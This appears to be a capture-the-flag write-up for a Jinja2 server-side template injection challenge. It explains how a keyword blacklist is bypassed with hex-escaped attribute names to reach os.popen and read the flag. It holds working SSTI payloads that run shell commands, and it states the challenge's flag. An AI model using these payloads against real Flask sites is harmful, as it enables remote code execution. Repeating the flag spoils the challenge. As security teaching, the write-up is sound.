# Challenge description

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! 

# Soluce

When we open the website, we can see a form where we can enter a message. If we enter `{{7*7}}`, we can see the result `49`. So we can use the `Jinja2` template engine. We have to find the index of the `popen` method in the `__mro__` list of the `str` class. We can do this by using the following command: `{{''.__class__.__mro__[1].__subclasses__()}}`. This time it doesn't work.

This SSTI challenge demonstrates why blacklisting is a poor approach to input sanitization. Although direct access to dangerous attributes like `__class__`, `__base__`, or `__subclasses__` was blocked, we bypassed the filters by dynamically constructing strings (e.g., using '\x5f\x5fimport\x5f\x5f' instead of `__import__`). Leveraging Flask’s request object, we accessed the application’s global scope, retrieved Python’s builtins, used `__import__` to load the os module, and executed system commands via os.popen(). This exploit highlights how dangerous logic remains accessible through indirect paths, proving that blacklisting keywords is not a secure defense against SSTI.

Then we can use this command to execute a command:

```python
{{ request
  | attr('application')
  | attr('\x5f\x5fglobals\x5f\x5f')
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
  | attr('popen')('ls')
  | attr('read')()
}}
```

We can see the result of the command:

```bash
__pycache__ app.py flag requirements.txt
```

Then we can use this command to read the flag:

```python
{{ request
  | attr('application')
  | attr('\x5f\x5fglobals\x5f\x5f')
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
  | attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
  | attr('popen')('cat flag')
  | attr('read')()
}}
```

So the flag is `picoCTF{sst1_f1lt3r_byp4ss_8b534b82}`.